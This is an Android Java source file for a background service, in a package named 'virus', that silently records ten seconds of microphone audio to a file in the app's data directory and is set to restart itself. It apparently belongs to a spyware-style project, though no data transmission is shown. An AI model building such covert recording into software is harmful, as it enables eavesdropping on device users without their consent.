package com.example.virus.Services;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import static android.support.constraint.motion.utils.Oscillator.TAG;

public class AudioService extends Service {
    public AudioService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return null;
        // throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onCreate()
    {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        if (checkPermission())
        {
            DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
        Date date = new Date();

        String filePrefix = this.getApplicationInfo().dataDir + "/audio-";

        recordAudio(filePrefix + formatter.format(date) + ".3gp", 10);
    }
        return Service.START_STICKY;

    }



   public void recordAudio(String file, final int time) {
        final MediaRecorder recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(file);

        try {
            recorder.prepare();
            } catch (IOException e) {}

        recorder.start();

        Thread timer = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException e) {
                    Log.d(TAG, "timer interrupted");
                } finally {
                    recorder.stop();
                    recorder.release();
                }
            }
        });

        timer.start();
    }
    private boolean checkPermission()
    {
        String permission = Manifest.permission.RECORD_AUDIO;
        int res = this.getBaseContext().checkCallingOrSelfPermission(permission);
        return (res == PackageManager.PERMISSION_GRANTED);
    }
}
